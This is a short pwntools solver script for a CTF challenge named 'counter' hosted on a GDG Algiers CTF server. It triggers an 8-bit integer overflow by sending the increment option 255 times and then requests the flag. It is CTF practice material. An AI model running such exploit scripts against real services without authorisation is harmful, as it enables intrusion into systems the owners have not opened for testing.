#!/usr/bin/env python3
from pwn import *

exe = ELF("./counter")

HOST, PORT = "pwn.chal.ctf.gdgalgiers.com", 1402

context.binary = exe

def main():
    global io

    io = conn()

    # Trigger integer overflow so that counter goes back to 0
    for i in range(255):
        io.recvuntil(b"Choice: ")
        io.sendline(b"1") # 1) ++

    io.recvuntil(b"Choice: ")
    io.sendline(b"3") # 3) Flag

    io.interactive()

def conn():
    if args.REMOTE:
        p = remote(HOST, PORT)
    else:
        p = process(exe.path)

    return p

if __name__ == "__main__":
    io = None
    try:
        main()
    finally:
        if io:
            io.close()
